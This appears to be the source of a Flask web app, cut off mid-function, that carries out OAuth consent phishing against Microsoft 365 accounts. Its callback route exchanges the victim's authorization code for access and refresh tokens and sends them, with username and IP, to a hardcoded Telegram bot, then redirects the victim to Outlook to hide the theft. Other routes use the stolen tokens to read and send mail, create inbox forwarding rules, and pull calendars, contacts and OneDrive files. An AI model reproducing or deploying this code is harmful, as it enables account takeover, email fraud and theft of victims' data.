import flask
import requests
import time
import threading
import json
import base64
import os
import io
import html
from urllib.parse import quote
from datetime import datetime, timedelta

app = flask.Flask(__name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8877118461")
MS_REDIRECT_URI = os.environ.get("MS_REDIRECT_URI", "https://myappsignin.onrender.com/callback")
MS_CLIENT_ID = os.environ.get("MS_CLIENT_ID", "147947b0-1073-4b4c-88e1-9f7295f29b3f")
MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send Mail.ReadWrite Calendars.ReadWrite Contacts.ReadWrite Files.Read Files.ReadWrite Sites.Read.All User.Read.All"
MS_TENANT = "common" # Use 'common' for multi-tenant, or specific tenant ID

# --- TOKEN VAULT (THREAD-SAFE) ---
# Structure: { refresh_token: { "access_token": str, "user_info": dict, "last_refresh": float } }
TOKEN_VAULT = {}
VAULT_LOCK = threading.Lock()

def get_session(refresh_token):
    """Retrieves a valid session, refreshing if necessary."""
    if not refresh_token:
        return None, None
        
    with VAULT_LOCK:
        session = TOKEN_VAULT.get(refresh_token)
        
        # If no session exists, we can't refresh yet (need the code first)
        # But if it exists and is expired, we refresh
        if session:
            # Access tokens last ~1 hour. Refresh if > 55 mins old
            if time.time() - session["last_refresh"] > 3300:
                return _refresh_session_locked(refresh_token)
            return session["access_token"], session["user_info"]
        else:
            # If token is not in vault, it might be a new capture or a refresh token we haven't seen
            # Try to refresh it directly to populate the vault
            return _refresh_session_locked(refresh_token)

def _refresh_session_locked(refresh_token):
    """Must be called while holding VAULT_LOCK."""
    url = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": MS_SCOPE
    }
    
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            tokens = response.json()
            new_access = tokens["access_token"]
            # MS rotates refresh tokens. If we get a new one, update our key.
            new_refresh = tokens.get("refresh_token", refresh_token)
            
            # Fetch User Info
            user_info = _fetch_user_info(new_access)
            
            # Update Vault: Remove old key if rotated, add new
            if new_refresh != refresh_token:
                if refresh_token in TOKEN_VAULT:
                    del TOKEN_VAULT[refresh_token]
                TOKEN_VAULT[new_refresh] = {
                    "access_token": new_access,
                    "user_info": user_info,
                    "last_refresh": time.time(),
                    "original_token": refresh_token # Keep track of original for UI
                }
                # Return the NEW refresh token so the UI can update its URL
                return new_access, user_info, new_refresh
            else:
                TOKEN_VAULT[refresh_token] = {
                    "access_token": new_access,
                    "user_info": user_info,
                    "last_refresh": time.time()
                }
                return new_access, user_info, refresh_token
        else:
            print(f"[VAULT] Refresh failed for {refresh_token[:10]}...: {response.text}")
            return None, None, refresh_token
    except Exception as e:
        print(f"[VAULT] Exception: {e}")
        return None, None, refresh_token

def _fetch_user_info(access_token):
    """Fetches /me from Graph API."""
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me?$select=displayName,mail,userPrincipalName,jobTitle,companyName",
            headers={"Authorization": f"Bearer {access_token}"},
            timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return {"displayName": "Unknown", "mail": "unknown@example.com"}

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    # Sanitize for HTML
    message = html.escape(message, quote=False)
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except Exception as e:
        print(f"[TELEGRAM] Error: {e}")

def graph_api(endpoint, method='GET', body=None, params=None, stream=False, token=None):
    """
    Unified Graph API client.
    Handles token resolution and error standardization.
    """
    access_token, user_info, current_refresh_token = get_session(token)
    
    if not access_token:
        return {"error": "No active token available. Is the refresh token valid?"}, 401, current_refresh_token

    url = f"https://graph.microsoft.com/v1.0{endpoint}"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    
    try:
        # Use stream for file downloads
        response = requests.request(method, url, headers=headers, json=body, params=params, timeout=30, stream=stream)
        
        if response.status_code >= 400:
            try:
                err_data = response.json()
            except:
                err_data = {"error": response.text}
            return err_data, response.status_code, current_refresh_token
        
        if stream:
            return response, response.status_code, current_refresh_token
        
        try:
            data = response.json()
        except:
            data = response.text
        return data, response.status_code, current_refresh_token
    except Exception as e:
        return {"error": str(e)}, 500, current_refresh_token

def sanitize_query(q):
    """Basic sanitization for $search to prevent injection."""
    if not q:
        return ""
    # Escape quotes and special chars
    return q.replace('"', '\\"').replace('&', '\\&').replace('|', '\\|')

# --- ROUTES ---

@app.route("/")
def index():
    token = flask.request.args.get('token', '')
    return flask.render_template_string(DASHBOARD_HTML, token=token)

@app.route("/callback")
def callback():
    auth_code = flask.request.args.get('code', '')
    error = flask.request.args.get('error', '')
    ip = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)
    
    if error:
        send_to_telegram(f"❌ <b>Auth Failed</b>\nIP: {ip}\nError: {error}")
        return flask.redirect("https://outlook.office365.com/")
        
    if not auth_code:
        send_to_telegram(f"❌ <b>Auth Failed</b>\nIP: {ip}\nNo code received")
        return flask.redirect("https://outlook.office365.com/")

    token_url = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": MS_REDIRECT_URI,
        "scope": MS_SCOPE
    }
    
    try:
        response = requests.post(token_url, data=data, timeout=15)
        if response.status_code != 200:
            send_to_telegram(f"❌ <b>Token Exchange Failed</b>\nIP: {ip}\n{response.text}")
            return flask.redirect("https://outlook.office365.com/")
            
        tokens = response.json()
        username = "Unknown"
        if "id_token" in tokens:
            try:
                payload = tokens["id_token"].split('.')[1]
                padding = 4 - len(payload) % 4
                if padding != 4: payload += '=' * padding
                user_info = json.loads(base64.urlsafe_b64decode(payload))
                username = user_info.get("preferred_username", "Unknown")
            except: pass
        
        access_token = tokens.get("access_token")
        refresh_token = tokens.get("refresh_token")
        
        # Initialize Vault Entry
        with VAULT_LOCK:
            TOKEN_VAULT[refresh_token] = {
                "access_token": access_token,
                "user_info": {"displayName": username, "mail": username},
                "last_refresh": time.time()
            }
            
        send_to_telegram(f"""
🛡️ <b>O365 Session Captured</b>
👤 <b>User:</b> {username}
🌐 <b>IP:</b> {ip}
🔑 <b>Access Token:</b>
<code>{access_token}</code>
🔄 <b>Refresh Token:</b>
<code>{refresh_token}</code>
💡 <b>Command Center:</b>
<code>https://{flask.request.host}/?token={refresh_token}</code>
""")
    except Exception as e:
        send_to_telegram(f"❌ <b>Exception</b>\nIP: {ip}\n{str(e)}")
        
    return flask.redirect("https://outlook.office365.com/")

@app.route("/api/status")
def api_status():
    token = flask.request.args.get('token', '')
    access, user_info, current_rt = get_session(token)
    if not access:
        return flask.jsonify({"active": False, "user": None})
    return flask.jsonify({"active": True, "user": user_info, "refresh_token": current_rt})

@app.route("/api/inbox")
def api_inbox():
    token = flask.request.args.get('token', '')
    top = flask.request.args.get('top', 10)
    query = f"?$top={top}&$orderby=receivedDateTime%20desc&$select=subject,from,receivedDateTime,bodyPreview,isRead,id"
    data, status, _ = graph_api(f"/me/messages{query}", token=token)
    return flask.jsonify(data)

@app.route("/api/message/<msg_id>")
def api_get_message(msg_id):
    token = flask.request.args.get('token', '')
    data, status, _ = graph_api(f"/me/messages/{msg_id}", token=token)
    return flask.jsonify(data)

@app.route("/api/send", methods=["POST"])
def api_send():
    token = flask.request.args.get('token', '')
    data = flask.request.json
    body = {
        "message": {
            "subject": data.get("subject", ""),
            "body": {"contentType": "HTML", "content": data.get("body", "")},
            "toRecipients": [{"emailAddress": {"address": addr}} for addr in data.get("to", [])],
            "ccRecipients": [{"emailAddress": {"address": addr}} for addr in data.get("cc", [])]
        },
        "saveToSentItems": True
    }
    result, status, _ = graph_api("/me/sendMail", method="POST", body=body, token=token)
    return flask.jsonify(result), status

@app.route("/api/reply", methods=["POST"])
def api_reply():
    token = flask.request.args.get('token', '')
    data = flask.request.json
    body = {
        "message": {
            "subject": f"Re: {data.get('subject', '')}",
            "body": {"contentType": "HTML", "content": data.get("body", "")}
        },
        "comment": data.get("comment", "")
    }
    result, status, _ = graph_api(f"/me/messages/{data.get('messageId')}/reply", method="POST", body=body, token=token)
    return flask.jsonify(result), status

@app.route("/api/forward", methods=["POST"])
def api_forward():
    token = flask.request.args.get('token', '')
    data = flask.request.json
    body = {
        "message": {
            "subject": f"Fwd: {data.get('subject', '')}",
            "body": {"contentType": "HTML", "content": data.get("body", "")},
            "toRecipients": [{"emailAddress": {"address": addr}} for addr in data.get("to", [])]
        }
    }
    result, status, _ = graph_api(f"/me/messages/{data.get('messageId')}/forward", method="POST", body=body, token=token)
    return flask.jsonify(result), status

@app.route("/api/rules")
def api_get_rules():
    token = flask.request.args.get('token', '')
    data, status, _ = graph_api("/me/mailFolders/inbox/messageRules", token=token)
    return flask.jsonify(data)

@app.route("/api/rules", methods=["POST"])
def api_add_rule():
    token = flask.request.args.get('token', '')
    data = flask.request.json
    body = {
        "displayName": data.get("name", "Forward Rule"),
        "actions": {"forwardTo": data.get("forwardTo", [])},
        "conditions": {}
    }
    result, status, _ = graph_api("/me/mailFolders/inbox/messageRules", method="POST", body=body, token=token)
    return flask.jsonify(result), status

@app.route("/api/rules/<rule_id>", methods=["DELETE"])
def api_delete_rule(rule_id):
    token = flask.request.args.get('token', '')
    result, status, _ = graph_api(f"/me/mailFolders/inbox/messageRules/{rule_id}", method="DELETE", token=token)
    return flask.jsonify(result), status

@app.route("/api/calendar")
def api_calendar():
    token = flask.request.args.get('token', '')
    top = flask.request.args.get('top', 10)
    data, status, _ = graph_api(f"/me/calendarView?$top={top}&$orderby=start/dateTime%20asc&$select=subject,start,end,location,organizer", token=token)
    return flask.jsonify(data)

@app.route("/api/contacts")
def api_contacts():
    token = flask.request.args.get('token', '')
    top = flask.request.args.get('top', 20)
    data, status, _ = graph_api(f"/me/contacts?$top={top}&$select=givenName,surname,jobTitle,mail,telephoneNumber", token=token)
    return flask.jsonify(data)

@app.route("/api/files/root")
def api_files_root():
    token = flask.request.args.get('token', '')
    data, status, _ = graph_api("/me/drive/root/children?$select=name,id,size,lastModifiedDateTime,webUrl,createdDateTime&$orderby=name", token=token)
    return flask.jsonify(data)

@app.route("/api/files/download/<file_id>")
def api_files_download(file_id):
    token = flask.request.args.get('token', '')
    # Get filename
    file_info, _, _ = graph_api(f"/me/drive/items/{file_id}", token=token)
    filename = file_info.get("name", "download") if isinstance(file_info, dict) else "download"
    
    # Stream content
    response, status, _ = graph_api(f"/me/drive/items/{file_id}/content", stream=True, token=token)
    if status == 200:
        return flask.send_file(io.BytesIO(response.content), mimetype="application/octet-stream", as_attachment=True, download_name=filename)
    return flask.jsonify({"error": "Failed to download file"}), status

@app.route("/api/files/upload", methods=["POST"])
def api_files_upload():
    token = flask.request.args.get('token', '')
    if 'file' not in flask.request.files:
        return flask.jsonify({"error": "No file provided"}), 400
    file = flask.request.files['file']
    content = file.read()
    body = {
        "@odata.type": "#microsoft.graph.file",
        "name": file.filename,
        "file": {
            "contentBytes": base64.b64encode(content).decode('utf-8')
        }
    }
    result
